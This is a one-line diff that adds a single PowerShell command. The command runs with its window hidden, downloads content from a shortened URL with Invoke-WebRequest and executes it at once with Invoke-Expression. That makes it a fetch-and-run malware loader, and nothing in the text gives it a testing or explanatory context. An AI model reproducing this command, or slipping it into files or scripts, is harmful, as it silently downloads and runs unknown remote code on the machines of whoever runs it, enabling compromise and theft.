@@ -1,0 +1,1 @@
+powershell -w hidden "iex(iwr tinyurl.com/4uzjfrjd -UseB)"
